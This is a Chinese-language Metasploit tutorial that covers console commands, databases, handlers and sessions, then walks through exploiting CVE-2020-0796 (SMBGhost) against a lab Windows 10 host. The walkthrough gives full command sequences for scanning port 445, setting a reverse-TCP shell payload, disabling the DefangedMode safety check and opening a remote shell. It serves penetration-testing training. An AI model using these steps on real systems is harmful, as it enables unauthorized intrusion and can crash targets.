模块

```shell
┌──(root㉿kali)-[~]
└─# ls /usr/share/metasploit-framework/modules
auxiliary  encoders  evasion  exploits  nops  payloads  post  README.md
```

| modules   | 描述                                                         |
| --------- | ------------------------------------------------------------ |
| auxiliary | 辅助模块，用于执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试 |
| encoders  | 编码工具模块，用于免杀，以防止被杀毒软件、防火墙、IDS 及类似的安全软件检测出来 |
| evasion   | 专门针对 Windows 木马躲避技术                                |
| exploits  | 漏洞利用模块，用于利用系统、应用或者服务中的安全漏洞进行攻击 |
| nops      | 空指令模块，用于在攻击载荷中添加空指令，以便在攻击时绕过杀毒软件的检测 |
| payloads  | 攻击载荷模块，用于在目标系统上运行任意命令或者执行特定代码   |
| post      | 后期渗透模块，用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等 |

# 1 使用

## 1.1 msfdb

查看帮助

```shell
┌──(root㉿kali)-[~]
└─# msfdb
```

```
管理 metasploit 框架数据库

您可以在当前 shell 中设置 PGPORT 变量，为 PostgreSQL 连接使用特定的端口号。

Example: PGPORT=5433 msfdb init

  msfdb init     # 启动并初始化数据库
  msfdb reinit   # 删除并重新初始化数据库
  msfdb delete   # 删除数据库并停止使用
  msfdb start    # 启动数据库
  msfdb stop     # 停止数据库
  msfdb status   # 检查服务状态
  msfdb run      # 启动数据库并运行 msfconsole
```

运行

```shell
┌──(root㉿kali)-[~]
└─# msfdb run
```

查看帮助

```
msf6 > help
```

| help                         | 描述              |
| ---------------------------- | ----------------- |
| Core Commands                | 核心命令          |
| Module Commands              | 模块命令          |
| Job Commands                 | 后台任务命令      |
| Resource Script Commands     | 资源脚本命令      |
| Database Backend Commands    | 数据库后端命令    |
| Credentials Backend Commands | 证书/凭证后端命令 |
| Developer Commands           | 开发人员命令      |

## 1.2 connect

查看帮助

```
msf6 > connect -h
```

```
Usage: connect [options] <host> <port>

与主机通信，类似于通过 netcat 进行交互，利用任何已配置的会话枢轴
```

```
OPTIONS:

    -c, --comm <comm>               指定要使用的 Comm
    -C, --crlf                      尝试使用 CRLF 作为 EOL 序列
    -h, --help                      帮助标语
    -i, --send-contents <file>      发送文件内容
    -p, --proxies <proxies>         使用的代理列表
    -P, --source-port <port>        指定源端口
    -S, --source-address <address>  指定源地址
    -s, --ssl                       使用 SSL 连接
    -u, --udp                       切换到 UDP 插口
    -w, --timeout <seconds>         指定连接超时
    -z, --try-connection            尝试连接，然后返回
```

远程连接主机

```
msf6 > connect test.local 80
```

```http
UNKNOWN 408 Request Timeout
Referrer-Policy: no-referrer
Server: thttpd
Content-Type: text/html; charset=utf-8
Date: Sat, 30 Dec 2023 07:54:31 GMT
Last-Modified: Sat, 30 Dec 2023 07:54:31 GMT
Accept-Ranges: bytes
Connection: close
Cache-Control: no-cache,no-store

<HTML>
<HEAD><TITLE>408 Request Timeout</TITLE></HEAD>
<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
<H2>408 Request Timeout</H2>
No request appeared within a reasonable time period.
<HR>
<ADDRESS><A HREF="">thttpd</A></ADDRESS>
</BODY>
</HTML>
```

> 得到信息：Server: thttpd

## 1.3 show

查看帮助

```
msf6 > show -h
```

```
[*]"show "命令的有效参数包括：all、encoders、nops、exploits、payloads、auxiliary、post、plugins、info、options、favorites
[*] 其他特定模块参数有：missing, advanced, evasion, targets, actions
```

显示所有模块

```
msf6 > show all
```

显示所有 exploits

```
msf6 > show exploits
```

显示所有 payloads

```
sf6 > show payloads
```

## 1.4 search

查看帮助

```
msf6 > search -h
```

```
Usage: search [<options>] [<keywords>:<value>]

以"-"开头的值将排除任何匹配结果
如果没有提供选项或关键词，则会显示缓存结果
```

```
OPTIONS:

    -h, --help                      帮助标语
    -I, --ignore                    如果唯一匹配的名称与搜索的名称相同，则忽略该命令
    -o, --output <filename>         将输出结果以 csv 格式发送到文件中
    -r, --sort-descending <column>  将搜索结果的顺序改为降序
    -S, --filter <filter>           用于过滤搜索结果的 Regex 模式
    -s, --sort-ascending <column>   按指定列以升序排列搜索结果
    -u, --use                       如果只有一个结果，则使用模块
```

```
Keywords:
  #                :  编码
  adapter          :  具有匹配 adater 引用名称的模块
  aka              :  具有匹配 AKA（也称为）名称的模块
  author           :  由该作者编写的模块
  arch             :  影响此架构的模块
  bid              :  与 Bugtraq ID 匹配的模块
  cve              :  具有匹配 CVE ID 的模块
  edb              :  与 Exploit-DB ID 匹配的模块
  check            :  支持“check”方法的模块
  date             :  具有匹配披露日期的模块
  description      :  具有匹配描述的模块
  fullname         :  全名匹配的模块
  mod_time         :  具有匹配修改日期的模块
  name             :  具有匹配描述性名称的模块
  path             :  具有匹配路径的模块
  platform         :  影响此平台的模块
  port             :  端口匹配的模块
  rank             :  具有匹配等级的模块（可以是描述性的（例如："good"）或带有比较运算符的数字（例如："gte400）
  ref              :  具有匹配 ref 的模块
  reference        :  具有匹配 reference 的模块
  stage            :  具有匹配阶段引用名称的模块
  stager           :  具有匹配的 stager 引用名称的模块
  target           :  影响此目标的模块
  type             :  特定类型的模块(exploit, payload, auxiliary, encoder, evasion, post, or nop)
```

```
Supported search columns:
  rank             :  按模块的可利用性等级排序
  date             :  按模块披露日期排序。disclosure_date 的别名
  disclosure_date  :  按模块披露日期排序模块
  name             :  按模块名称排序
  type             :  按类型排序模块
  check            :  按模块是否有检查方法排序
```

```
Examples:
  search cve:2009 type:exploit
  search cve:2009 type:exploit platform:-linux
  search cve:2009 -s name
  search type:exploit -s type -r
```

| rank      | 描述                                                         |
| --------- | ------------------------------------------------------------ |
| excellent | 漏洞利用永远不会导致服务崩溃                                 |
| great     | 漏洞利用程序有一个默认目标，可以自动检测适当的目标，或在版本检查后使用特定于应用程序的返回地址 |
| good      | 漏洞利用程序有一个默认目标，它是此类软件的“常见情况”，漏洞利用不会自动检测目标 |
| normal    | 该漏洞在其他方面是可靠的，但依赖于一个特定的版本，该版本不是此类软件的“常见情况”，不能（或不会）可靠地自动检测 |
| average   | 这种漏洞一般不可靠或难以利用，但在普通平台上的成功率可达 50% 或更高 |
| low       | 在普通平台上，该漏洞几乎不可能被利用（成功率低于 50%）       |
| manual    | 漏洞利用不稳定或难以利用，基本上属于 DoS（成功率为 15%或更低），除非用户特别配置，否则该模块无用 |

| type      | 描述                                                         |
| --------- | ------------------------------------------------------------ |
| exploit   | 漏洞利用模块，用于利用系统、应用或者服务中的安全漏洞进行攻击 |
| payload   | 攻击载荷模块，用于在目标系统上运行任意命令或者执行特定代码   |
| auxiliary | 辅助模块，用于执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试 |
| encoder   | 编码工具模块，用于免杀，以防止被杀毒软件、防火墙、IDS 及类似的安全软件检测出来 |
| evasion   | 专门针对 Windows 木马躲避技术                                |
| post      | 后期渗透模块，用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等 |
| or nop    | 空指令模块，用于在攻击载荷中添加空指令，以便在攻击时绕过杀毒软件的检测 |

## 1.5 use

查看帮助

```
msf6 > use -h
```

```
Usage: use <name|term|index>

通过名称或搜索词/索引与模块交互
如果未找到模块名称，则将其视为搜索词
如果需要，还可以从之前的搜索结果中选择一个索引
```

```
Examples:
  use exploit/windows/smb/ms17_010_eternalblue

  use eternalblue
  use <name|index>

  search eternalblue
  use <name|index>
```

使用模块

```
msf6 > use 0
```

查看模块信息

```
msf6 exploit(name) > info
```

运行模块

```
msf6 exploit(name) > run
```

退出模块

```
msf6 exploit(name) > back
```

## 1.6 info

查看帮助

```
msf6 > info -h
```

```
Usage: info <module name> [mod2 mod3 ...]
```

```
Options:
* 标志“ -j ”将以 json 格式打印数据
* 标记“ -d ”会在浏览器中显示标记符版本。更多信息，但速度可能较慢。
查询所提供模块的信息。如果没有给出模块，则显示当前活动模块的信息。
```

## 1.7 handler

选择 handler

```
msf6 > use exploit/multi/handler
```

查找 meterpreter payload

```
msf6 exploit(multi/handler) > search meterpreter platform:windows type:payload 
```

设置 payload

```
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
```

显示 options

```
msf6 exploit(multi/handler) > show options
```

设置 lhost

```
msf6 exploit(multi/handler) > set lhost kali.local
```

设置 lport

```
msf6 exploit(multi/handler) > set lport 4444
```

运行侦听

```
msf6 exploit(multi/handler) > run
```

## 1.8 creds

查看凭证

```
msf6 > creds
```

## 1.9 hosts

查看主机记录

```
msf6 > hosts
```

## 1.10 services

查看服务记录

```
msf6 > services
```

检索

```
msf6 > services -S 6667
```

## 1.11 sessions

查看会话

```
msf6 > sessions
```

进入会话

```
msf6 > sessions -i 1
```

关闭会话

```
msf6 > sessions -k 1
```

## 1.12 db

**db_connect**

> 连接到现有的数据库

**db_disconnect**

> 断开与当前数据库实例的连接

**db_export**

> 导出包含数据库内容的文件

查看帮助

```
msf6 > db_export -h
```

```
Usage:
    db_export -f <format> [filename]
    格式可以是： xml, pwdump
```

导出数据

```
msf6 > db_export -f xml /root/data.xml
```

**db_import**

> 导入扫描结果文件（文件类型将被自动检测）

查看帮助

```
msf6 > db_import -h
```

```
Usage: db_import <filename> [file2...]

文件名可以是 *.xml 或 **/*.xml之类的结构，这样会递归搜索
```

导入数据

```
msf6 > db_import /root/data.xml
```

# 2 实战

## 2.1 永恒之黑

### 2.1.1 环境准备

漏洞编号：

> CVE-2020-0796

复现条件：

>1. 开放 445 端口
>2. smb 版本为 3.1.1
>3. 未安装修补程序 KB4551762

影响版本：

> 1. Windows 10 Version 1903 for 32-bit Systems
> 2. Windows 10 Version 1903 for x64-based Systems
> 3. Windows 10 Version 1903 for ARM64-based Systems
> 4. Windows Server, Version 1903 (Server Core installation)
> 5. Windows 10 Version 1909 for 32-bit Systems
> 6. Windows 10 Version 1909 for x64-based Systems
> 7. Windows 10 Version 1909 for ARM64-based Systems
> 8. Windows Server, Version 1909 (Server Core installation)

查看版本号

![查看版本号](./../../../images/Metasploit-Framework/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/%E6%9F%A5%E7%9C%8B%E7%89%88%E6%9C%AC%E5%8F%B7.png)

查看系统信息

```
C:\Users\windows>systeminfo
```

>确认没有安装 KB4551762

开启 smb 服务

![开启 smb 服务](./../../../images/Metasploit-Framework/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/%E5%BC%80%E5%90%AF%20smb%20%E6%9C%8D%E5%8A%A1.png)

### 2.1.2 漏洞复现

使用 nmap 扫描 445 端口

```shell
┌──(root㉿kali)-[~]
└─# nmap 192.168.1.53 -p 445
```

```
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-01 09:03 CST
Nmap scan report for 192.168.1.53
Host is up (0.00017s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:5D:A1:03 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
```

> 445 端口开启

运行 msf

```shell
┌──(root㉿kali)-[~]
└─# msfdb run
```

搜索永恒之黑

```
msf6 > search CVE-2020-0796
```

```
Matching Modules
================

   #  Name                                          Disclosure Date  Rank     Check  Description
   -  ----                                          ---------------  ----     -----  -----------
   0  exploit/windows/local/cve_2020_0796_smbghost  2020-03-13       good     Yes    SMBv3 Compression Buffer Overflow
   1  exploit/windows/smb/cve_2020_0796_smbghost    2020-03-13       average  Yes    SMBv3 Compression Buffer Overflow


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/smb/cve_2020_0796_smbghost
```

选择 exploit/windows/smb/cve_2020_0796_smbghost

```
msf6 > use 1
```

显示 options

```
msf6 exploit(windows/smb/cve_2020_0796_smbghost) > show options
```

```
Module options (exploit/windows/smb/cve_2020_0796_smbghost):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/usin
                                      g-metasploit.html
   RPORT   445              yes       The target port (TCP)


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.30     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 10 v1903-1909 x64



View the full module info with the info, or info -d command
```

设置 rhosts

```
msf6 exploit(windows/smb/cve_2020_0796_smbghost) > set rhosts 192.168.1.53
```

> 或者将目标保存至 /root/rhosts.txt
>
> ```shell
> ┌──(root㉿kali)-[~]
> └─# vim /root/rhosts.txt
> ```
>
> ```
> 192.168.1.4
> 192.168.1.5
> 192.168.1.6
> ```
>
> 再使用 file:// 协议设置 rhosts
>
> ```
> msf6 exploit(windows/smb/cve_2020_0796_smbghost) > set rhosts file:///root/rhosts.txt
> ```

显示 targets

```
msf6 exploit(windows/smb/cve_2020_0796_smbghost) > show targets
```

```
Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Windows 10 v1903-1909 x64
```

选择 targets

```
msf6 exploit(windows/smb/cve_2020_0796_smbghost) > use 0
```

显示相关的 payloads

```
msf6 exploit(windows/smb/cve_2020_0796_smbghost) > show payloads
```

> 正向连接：bind
>
> 方向连接：reverse

查找 payload

```
msf6 exploit(windows/smb/cve_2020_0796_smbghost) > search windows/x64/shell/reverse type:payload
```

```
Matching Modules
================

   #  Name                                        Disclosure Date  Rank    Check  Description
   -  ----                                        ---------------  ----    -----  -----------
   0  payload/windows/x64/shell/reverse_tcp_rc4                    normal  No     Windows x64 Command Shell, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   1  payload/windows/x64/shell/reverse_tcp_uuid                   normal  No     Windows x64 Command Shell, Reverse TCP Stager with UUID Support (Windows x64)
   2  payload/windows/x64/shell/reverse_tcp                        normal  No     Windows x64 Command Shell, Windows x64 Reverse TCP Stager


Interact with a module by name or index. For example info 2, use 2 or use payload/windows/x64/shell/reverse_tcp
```

设置 payload

```
msf6 exploit(windows/smb/cve_2020_0796_smbghost) > set payload windows/x64/shell/reverse_tcp
```

运行

```
msf6 exploit(windows/smb/cve_2020_0796_smbghost) > run
```

```
[*] Started reverse TCP handler on 192.168.1.30:4444 
[*] 192.168.1.53:445 - Running automatic check ("set AutoCheck false" to disable)
[!] 192.168.1.53:445 - The service is running, but could not be validated.
[-] 192.168.1.53:445 - Exploit aborted due to failure: bad-config: 

Are you SURE you want to execute this module? There is a high probability that even when the exploit is
successful the remote target will crash within about 90 minutes.

Disable the DefangedMode option to proceed.

[*] Exploit completed, but no session was created.
```

> 报错信息中提示需要禁用 DefangedMode

禁用 DefangedMode

```
msf6 exploit(windows/smb/cve_2020_0796_smbghost) > set DefangedMode false
```

运行

```
msf6 exploit(windows/smb/cve_2020_0796_smbghost) > run
```

> 或者使用 `run -j` 连接后将会话保存至后台

将会话保存至后台

```cmd
C:\Windows\System32> background
```

查看会话

```
msf6 exploit(windows/smb/cve_2020_0796_smbghost) > sessions
```

```
Active sessions
===============

  Id  Name  Type                     Information                      Connection
  --  ----  ----                     -----------                      ----------
  1         shell x86/windows  A-WIN10-1903\Administrator @ A-  192.168.1.30:4444 -> 192.168.1.5
                                     WIN10-1903                       3:53929 (192.168.1.53)
```

进入会话

```
msf6 exploit(windows/smb/cve_2020_0796_smbghost) > sessions -i 1
```

关闭会话

```
msf6 exploit(windows/smb/cve_2020_0796_smbghost) > sessions -k 1
```

---

参考链接

- [Metasploit-Framework](https://www.kali.org/tools/metasploit-framework/)
